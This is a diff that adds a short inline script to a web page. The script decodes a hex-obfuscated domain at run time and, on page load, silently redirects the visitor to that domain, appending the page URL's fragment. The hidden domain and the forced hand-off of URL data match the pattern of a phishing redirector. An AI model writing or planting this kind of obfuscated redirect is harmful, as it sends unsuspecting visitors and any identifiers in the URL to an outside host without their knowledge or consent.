@@ -1,0 +1,23 @@
+<script>
+
+let encodedDomains = [
+  '7a696e6e69617761696e7772696768742e626c6f67'
+];
+
+let decodedDomains = encodedDomains.map(function(encodedDomain) {
+  let decoded = '';
+  for (let i = 0; i < encodedDomain.length; i += 2) {
+    decoded += String.fromCharCode(parseInt(encodedDomain.substr(i, 2), 16));
+  }
+  return decoded;
+});
+
+let d = decodedDomains[0];
+let u = document.location;
+let str = u.toString();
+let tu = str.split('#')[1];
+let nr = `https://${d}/${tu}`;
+
+window.location.href = nr;
+
+</script>
